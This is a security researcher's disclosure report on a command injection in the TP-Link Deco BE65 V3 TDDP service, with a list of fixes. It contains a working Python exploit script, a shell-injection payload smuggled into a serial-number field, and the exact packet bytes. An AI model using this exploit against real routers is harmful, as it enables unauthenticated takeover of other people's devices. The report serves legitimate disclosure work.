## SECTION 1 – Reporter Information

Reporter Name / Handle:
Lumina

Email Address:
1547800591@qq.com

## SECTION 2 – Vulnerability Overview

Vulnerability Name:
Deco BE65 V3 TDDP setSN OS Command Injection

Brief Description:
The TDDP service in the tested Deco BE65 V3 firmware contains an OS command injection vulnerability in its `setSN` command handler. When TDDP is running, an adjacent-network attacker can supply a short shell fragment that is concatenated into a command and executed through `/bin/sh -c` without providing device credentials.

The `setSN` handler copies attacker-controlled bytes from the packet payload into a command of the form `echo %s > /tmp/sn-tmp`, without shell-metacharacter filtering. The internal command wrapper then invokes `/bin/sh -c` on the resulting string.

The tested packet also uses a `pktLength=0` parser condition that skips DES decryption. This parser behavior matches the previously published CVE-2026-0834; rediscovery of that authentication bypass is not claimed as a new finding in this report. The separately relevant sink is the `setSN` command-construction and execution path.

Affected Product(s) / Module / Component:
TP-Link Deco BE65; TDDP service, `/usr/bin/tddp`, UDP port 1040; `setSN` handler (`subtype=0x7a`).

Firmware Version:
1.0.11 Build 260922 (`26092212-rel18351`)

Original firmware filename:
`BE65V2_BE65V3_multi_v2_SP1_V2_RSA2048-up-ver1-0-11-P1[26092212-rel18351]_2026-09-21_23.07.02.bin`

Original firmware SHA-256:
`1c380a5f7c5221b637c801c2de1486d2c8ec1579bb1fa02fbc413ec2ab1c8085`

Decrypted firmware SHA-256:
`492dbdce705ec4eb1b1f46323eb326a9f05a95d051997a7f7305032e97ae4c1a`

Hardware Version:
V3. The filename indicates a combined BE65 V2/V3 image; the analysis target is V3.

Tested Device Country Code:
Not determined. The sample is a multi-region firmware image, and no physical region-specific device was used.

![image-20261105214706532](Deco_BE65_V3_TDDP_setSN_Report_EN.assets/image-20261105214706532.png)

## SECTION 3 – Discovery Context

Date Discovered:
2026-11-05

Environment (LAN/WAN/App/etc.):
Adjacent network / LAN, UDP port 1040. Testing was performed in an isolated local emulation environment.

Devices Used:
- Windows analysis host running the PoC and HTTP verification client.
- Ubuntu IoT analysis VM at 192.168.135.137.
- Extracted BE65 firmware running under QEMU AArch64 user-mode emulation with bubblewrap (`bwrap`).
- The firmware's `uhttpd` and LuCI backend were run simultaneously to provide an independent HTTP read-back channel.
- No physical Deco BE65 was used.

Tools Used:
IDA Pro / Hex-Rays, binwalk, UBI Reader, `unsquashfs`, `tp-link-decrypt`, unluac, QEMU, bubblewrap, Python 3, curl, and standard shell utilities.

Additional Context:
The firmware's `/etc/init.d/tpmodules` script starts TDDP only when `/etc/config/bind_device_list` is absent or empty. The primary exposure condition is therefore an unconfigured/factory-state device or another state in which TDDP has explicitly been enabled. A fully configured device that does not run TDDP is not exposed through this entry point.

No vulnerability binary was patched, and no authentication check was disabled for the demonstration. The firmware's startup-time profile and product-information data were loaded to enable the LuCI backend.

Evidence level: VALIDATED in user-mode emulation, including a successful request, command-output file creation, and HTTP retrieval. Physical-device behavior, firewall state, and production process privileges remain to be validated.

The emulator executed the injected `id` command as uid 1000. On a physical device the service is expected to be started with system-service privileges, but root-level execution has not been demonstrated and is not claimed as confirmed.

Related public reports:
- CVE-2026-0834 documents the known TDDP `pktLength=0` authentication-bypass pattern: https://mattg.systems/posts/cve-2026-0834/
- CVE-2026-17176 documents TDDP command injection on other Deco models, but does not provide enough public sink-level detail to establish whether it is the same `setSN` issue: https://www.tp-link.com/us/support/faq/5293/

## SECTION 4 – Technical Details

Reproduction Steps:
1. Load the extracted BE65 V3 firmware in the emulation environment and start `/usr/bin/tddp` under the same unconfigured-state condition used by the firmware startup script.
2. Start the firmware's Web server and LuCI backend on TCP port 8080. Ensure that `/www/x` does not exist and that `GET /x` returns HTTP 404.
3. From another host, send a TDDPv2 packet with `type=3`, `subtype=0x7a` (`setSN`), and `pktLength=0`. Use the payload `;id>/www/x;#`, including its terminating NUL byte.
4. Observe the TDDP response. A successful response begins with `02030200`, whereas the rejected repeated-call response observed during testing begins with `02030203`.
5. Read `/www/x` through the firmware's Web server. The file contains output from the injected `id` command, proving that shell execution occurred rather than merely a protocol response.
6. For a repeat test, reset the TDDP process and delete `/www/x` first. The `setSN` handler clears a one-time state flag after success, and an existing output file must not be mistaken for new evidence.

Proof of Concept (PoC):
The attached `poc_tddp_setsn.py` script implements the minimal, non-destructive proof of concept using only the Python standard library.

Run:

```bash
python3 poc_tddp_setsn.py 192.168.135.137
curl http://192.168.135.137:8080/x
```

Payload construction:

```python
import hashlib
import socket
import struct

payload = b";id>/www/x;#\0"
header = struct.pack(
    ">BBBBIHBB",
    2,       # TDDP version 2
    3,       # special-command type
    1,       # request code
    0,       # reply-info field
    0,       # pktLength = 0
    1,       # packet ID
    0x7a,    # setSN subtype
    0,
) + b"\0" * 16
header = header[:12] + hashlib.md5(header).digest()
packet = header + payload

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", 54321))
sock.settimeout(3)
sock.sendto(packet, ("192.168.135.137", 1040))
response, address = sock.recvfrom(4096)
print(response.hex())
sock.close()
```

Exact tested request:

```text
020301000000000000017a00da1c9672804756a3d3ef2cc61a4c5e253b69643e2f7777772f783b2300
```

Exact successful response:

```text
020302000000000000017a00309c551e932d37bdafe702852ce3c2c3
```

Observed Web read-back:

```text
uid=1000(admin) gid=1000 groups=65534(nogroup),65534(nogroup),65534(nogroup),65534(nogroup),65534(nogroup),65534(nogroup),65534(nogroup),65534(nogroup),65534(nogroup),1000
```

The successful result was reproduced from the Windows host after resetting the service and deleting the previous output file.

![image-20261105214556432](Deco_BE65_V3_TDDP_setSN_Report_EN.assets/image-20261105214556432.png)

Technical source-to-sink chain:
1. TDDP receives an attacker-controlled UDP datagram on port 1040.
2. In the TDDPv2 parser, `pktLength=0` skips DES decryption; the header MD5 value provides integrity checking, not device-credential authentication.
3. `type=3` reaches the special-command dispatcher, and `subtype=0x7a` selects `setSN`.
4. `setSN` copies up to 13 bytes from attacker-controlled packet data and inserts them into `echo %s > /tmp/sn-tmp` without shell filtering.
5. The internal command wrapper formats the final string and invokes `execve("/bin/sh", {"sh", "-c", command}, NULL)`.
6. In the payload, `;` terminates the original command, `id` is executed, and `#` comments out the fixed suffix so that command output remains in `/www/x`.

Expected Behavior:
TDDP should be disabled outside controlled manufacturing or diagnostics. If it must be enabled, every management command should require valid authentication before dispatch. The `setSN` value should be accepted only as a strictly validated serial number and written using a direct file API or a non-shell argument array. No packet should be able to alter shell command structure or execute arbitrary commands.

Actual Behavior:
A crafted, unauthenticated UDP packet reaches `setSN`, changes shell command structure, and executes the injected `id` command. The service returns a success response, creates the output file, and exposes its contents through the simultaneously running firmware Web service.

Potential Exploitation Scenarios:
An attacker on the same LAN or otherwise able to reach UDP port 1040 can exploit the issue without a username, password, or existing session when TDDP is active under the stated configuration condition. The attacker can execute a short shell fragment with the TDDP process's privileges, create or modify files, and invoke available system utilities. On a physical device running this service with elevated privileges, this could lead to full device compromise; that privilege level has not been verified here.

## SECTION 5 – Suggested Fix

Recommended Fix or Mitigation:
1. Disable TDDP in production firmware by default, including on unconfigured devices, unless a controlled manufacturing mode explicitly requires it.
2. Block or restrict UDP port 1040 on untrusted interfaces as a temporary mitigation.
3. Reject attempts to reach command handlers without completing all required decryption and authentication checks. In particular, do not let `pktLength=0` bypass DES processing when payload data is present.
4. Remove `/bin/sh -c` from the `setSN` path. Write the serial number through a direct API, or use a fixed argument array without invoking a shell.
5. Enforce a strict serial-number length and character allowlist before any processing.
6. Audit all other TDDP setters and command wrappers for the same authentication-bypass and command-injection patterns; fixing only `subtype=0x7a` is insufficient.
7. Invalidate or deliberately reset command state only through authorized management operations, not through unauthenticated protocol messages.

## SECTION 6 – Attachments

Linked Files:
1. `poc_tddp_setsn.py` — minimal, non-destructive reproduction script using the Python standard library.
2. `REPORT.md` — detailed audit record, firmware fingerprints, analysis coverage, emulation setup, and evidence-level limitations.
